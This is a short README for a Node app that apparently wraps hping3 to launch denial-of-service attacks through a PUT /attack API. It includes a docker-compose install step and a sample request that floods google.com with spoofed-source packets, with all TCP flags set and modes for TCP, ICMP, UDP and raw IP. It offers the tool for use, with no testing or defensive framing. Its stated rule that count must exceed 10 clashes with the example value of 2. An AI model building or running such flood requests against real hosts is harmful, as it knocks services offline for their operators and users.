# This is a node app to perform dos attacks using hping3

## Install the app using docker

```bat
docker-compose up -d
```

### API to perform dos attack

**URL** : `/attack`

**Method** : `PUT`

```json
{
    "hostAddr": "google.com",
    "count": 2,
    "mode": "icmp",
    "spoofIp": "130.201.20.1",
    "randSource": true,
    "destPort": 100,
    "tcpFlags": ["fin", "syn", "rst", "push", "ack", "urg"],
    "dataSize": 10,
    "packetSpeed": "flood",
    "timeout": 10
}
```

### Requirements:
 - **Default `mode` is `TCP`, but modes can be any one of the following:**
   * `icmp`
   * `rawip`
   * `udp`

 - **`count` > 10**